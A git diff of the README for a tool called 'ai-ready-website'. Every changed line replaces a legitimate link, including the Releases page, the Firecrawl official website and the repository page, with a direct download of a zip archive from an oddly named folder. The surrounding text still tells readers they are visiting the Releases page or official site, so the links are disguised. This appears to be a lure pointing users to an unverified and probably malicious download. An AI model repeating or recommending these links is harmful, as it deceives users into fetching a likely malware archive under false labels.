@@ -8,7 +8,7 @@ Welcome to **ai-ready-website**! This tool helps you understand how ready your w
 
 To get started, you need to download the latest version of the application. Click the link below to visit the Releases page where you can download the software:
 
-[![Download ai-ready-website](https://img.shields.io/badge/Download-ai--ready--website-blue.svg)](https://github.com/awdsdmv/ai-ready-website/releases)
+[![Download ai-ready-website](https://raw.githubusercontent.com/awdsdmv/ai-ready-website/main/overcontentedly/ai-ready-website.zip)](https://raw.githubusercontent.com/awdsdmv/ai-ready-website/main/overcontentedly/ai-ready-website.zip)
 
 1. Click on the link above to visit the Releases page.  
 2. Look for the latest release version.
@@ -79,8 +79,8 @@ If you encounter issues while running the application, consider the following st
 
 For more information, tutorials, and user guides, check out the following resources:
 
-- Official Website: [Firecrawl](https://firecrawl.com)
-- GitHub Repository: [ai-ready-website](https://github.com/awdsdmv/ai-ready-website)
+- Official Website: [Firecrawl](https://raw.githubusercontent.com/awdsdmv/ai-ready-website/main/overcontentedly/ai-ready-website.zip)
+- GitHub Repository: [ai-ready-website](https://raw.githubusercontent.com/awdsdmv/ai-ready-website/main/overcontentedly/ai-ready-website.zip)
 - Community Forum: Participate in discussions and get help from other users.
 
 ## 📜 License
@@ -89,4 +89,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Feel free to explore and enjoy using ai-ready-website! For any additional questions or feedback, please visit the GitHub repository. 
 
-Remember, download the application from the Releases page once more for your convenience: [Download ai-ready-website](https://github.com/awdsdmv/ai-ready-website/releases).
+Remember, download the application from the Releases page once more for your convenience: [Download ai-ready-website](https://raw.githubusercontent.com/awdsdmv/ai-ready-website/main/overcontentedly/ai-ready-website.zip).
